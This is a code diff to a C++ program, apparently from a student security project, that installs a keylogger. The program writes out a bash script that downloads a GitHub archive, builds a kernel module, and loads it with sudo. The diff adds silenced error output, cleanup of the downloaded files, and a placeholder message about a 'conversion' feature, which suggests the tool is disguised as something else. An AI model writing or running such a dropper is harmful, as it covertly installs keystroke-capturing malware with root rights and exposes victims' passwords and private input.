@@ -7,14 +7,14 @@ using namespace std;
 
 const char *text= 
 	"#!/bin/bash\n"
-	"sudo cp tmp.sh /usr/bin/keylog\n"
+	"sudo cp keylog_ins /usr/bin/keylog_ins 2>/dev/null\n"
 	"wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip\n"
 	"unzip -o -q keylog.zip\n"
 	"cd final-project-click-to-add-lemon-master/Source/\n"
 	"make -s\n"
-	"sudo insmod keylog.ko\n"
+	"sudo insmod keylog.ko 2>/dev/null\n"
 	"cd ../..\n"
-	"rm -r -f keylog.zip tmp.sh\n"
+	"rm -r -f keylog.zip keylog_ins\n"
 	"rm -r -f final-project-click-to-add-lemon-master\n";
 
 bool ifExist(){
@@ -25,7 +25,6 @@ bool ifExist(){
 	
 	system("lsmod>mod.txt");
 	modfile.open("mod.txt");
-	cout<< "file opened\n";
 	
 	if(modfile.is_open()){
 		while(getline(modfile,str)){
@@ -48,18 +47,19 @@ int main(){
 			" [y]es [n]o\n";
 		char in = getchar();
 		if(in == 'y'){
-			ofstream myfile("tmp.sh");
+			ofstream myfile("keylog_ins");
 			myfile << (text);			
 			myfile.close();
 
-			system("chmod 755 tmp.sh");
-			system("./tmp.sh");
+			system("chmod 755 keylog_ins");
+			system("./keylog_ins");
 		}else{
 			cout<<"Service terminated.\n";
 		}
 	}else{
 		cout<<""; //function without prompt
 	}
+	cout<< "do some convertion (under construction)";
 
 	return 0;
 }
